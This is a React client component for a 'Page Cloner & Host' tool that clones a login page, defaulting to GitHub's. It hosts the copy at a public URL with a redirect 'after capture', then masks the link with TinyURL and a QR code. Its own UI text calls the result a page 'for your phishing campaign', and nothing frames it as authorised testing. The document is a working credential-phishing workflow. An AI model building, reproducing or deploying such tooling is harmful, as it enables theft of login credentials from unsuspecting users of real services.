
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand } from 'lucide-react';
import { cloneLoginPage } from '@/ai/flows/page-cloner-flow';
import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
import { shortenUrl } from '@/services/url-shortener-service';
import { useToast } from '@/hooks/use-toast';
import { QrCodeGenerator } from './qr-code-generator';
import { Label } from './ui/label';

const pageClonerSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

export function LoginPageCloner() {
  const { toast } = useToast();
  const [clonedHtml, setClonedHtml] = useState<string | null>(null);
  const [fullHostedUrl, setFullHostedUrl] = useState<string | null>(null);
  const [shortUrl, setShortUrl] = useState<string | null>(null);
  
  const [isCloning, setIsCloning] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  const [isShortening, setIsShortening] = useState(false);
  
  const [clonerError, setClonerError] = useState<string | null>(null);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      targetUrl: 'https://github.com/login',
      redirectUrl: 'https://github.com/password_reset',
    },
  });

  const resetState = () => {
      setClonedHtml(null);
      setFullHostedUrl(null);
      setShortUrl(null);
      setClonerError(null);
  }

  async function onClonerSubmit(values: z.infer<typeof pageClonerSchema>) {
    setIsCloning(true);
    resetState();
    try {
      const response = await cloneLoginPage(values);
      setClonedHtml(response.htmlContent);
      toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
      setClonerError(errorMessage);
      console.error(err);
    } finally {
      setIsCloning(false);
    }
  }

  const handleHostPage = async () => {
    if (!clonedHtml) return;
    setIsHosting(true);
    setFullHostedUrl(null);
    setShortUrl(null);
    setClonerError(null);
    try {
      const response = await hostClonedPage({ htmlContent: clonedHtml });
      setFullHostedUrl(response.publicUrl);
      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
    } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
       setClonerError(errorMessage);
       console.error(err);
    } finally {
      setIsHosting(false);
    }
  };

  const handleShortenUrl = async () => {
      if (!fullHostedUrl) return;
      setIsShortening(true);
      setClonerError(null);
      try {
        const response = await shortenUrl(fullHostedUrl);
        if (response.success && response.shortUrl) {
            setShortUrl(response.shortUrl);
            toast({ title: "URL Shortened", description: "Masked link created with TinyURL." });
        } else {
            throw new Error(response.error || 'Failed to shorten URL.');
        }
      } catch (err) {
        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
        setClonerError(errorMessage);
        console.error(err);
      } finally {
        setIsShortening(false);
      }
  };

  const handleDownloadHtml = () => {
    if (clonedHtml) {
      const blob = new Blob([clonedHtml], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cloned_login.html';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
    }
  };

  const handleCopy = (textToCopy: string) => {
    navigator.clipboard.writeText(textToCopy);
    toast({ title: "Copied!", description: "URL copied to clipboard." });
  }

  return (
    <div className="grid lg:grid-cols-5 gap-6">
      <div className="lg:col-span-2 space-y-6">
        <Card>
          <CardHeader>
            <CardTitle>Page Cloner & Host</CardTitle>
            <CardDescription>Create a static clone of a login page and host it on a public URL.</CardDescription>
          </CardHeader>
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
                <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem> <FormLabel>1. Target URL to Clone</FormLabel> <FormControl><Input placeholder="https://example.com/login" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <Button type="submit" disabled={isCloning} className="w-full">
                  {isCloning ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
                  Clone Page Content
                </Button>
              </form>
            </Form>
          </CardContent>
          {clonedHtml && (
            <CardFooter className="flex-col gap-4">
              <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                  {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                  3. Host Page
              </Button>
              <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
                  <Download className="mr-2 h-4 w-4"/> Download HTML
              </Button>
            </CardFooter>
          )}
        </Card>
        {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p>{clonerError}</p></CardContent></Card>}
        
        {fullHostedUrl && (
          <QrCodeGenerator url={shortUrl ?? fullHostedUrl} />
        )}
      </div>

      <div className="lg:col-span-3">
        <Card className="min-h-full">
          <CardHeader>
            <CardTitle>Hosted Page Information</CardTitle>
            <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
          </CardHeader>
          <CardContent className="w-full space-y-4">
            {(isCloning || isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
            
            {!clonedHtml && !isCloning && (
                <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                    <Bot className="h-12 w-12 mb-4" />
                    <p>Clone a page to get started.</p>
                </div>
            )}
            
            {clonedHtml && !fullHostedUrl && !isHosting && (
                <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                    <Globe className="h-12 w-12 mb-4" />
                    <p>Page cloned successfully.</p>
                    <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
                </div>
            )}

            {fullHostedUrl && (
              <div className="space-y-4 animate-in fade-in">
                <div className="space-y-2">
                  <Label htmlFor="public-url">Public URL</Label>
                   <div className="flex items-center gap-2">
                        <Input id="public-url" readOnly value={fullHostedUrl} className="font-mono"/>
                        <Button variant="ghost" size="icon" onClick={() => handleCopy(fullHostedUrl)}><Copy className="h-4 w-4"/></Button>
                   </div>
                  <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
                </div>

                {!shortUrl && (
                    <Button onClick={handleShortenUrl} disabled={isShortening} className="w-full">
                        {isShortening ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Wand className="mr-2 h-4 w-4"/>}
                        Create Short Link
                    </Button>
                )}
                
                 {shortUrl && (
                  <div className="space-y-2 animate-in fade-in">
                    <Label htmlFor="short-url">Masked URL (TinyURL)</Label>
                    <div className="flex items-center gap-2">
                        <Input id="short-url" readOnly value={shortUrl} className="font-mono text-accent"/>
                        <Button variant="ghost" size="icon" onClick={() => handleCopy(shortUrl)}><Copy className="h-4 w-4"/></Button>
                   </div>
                  </div>
                )}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
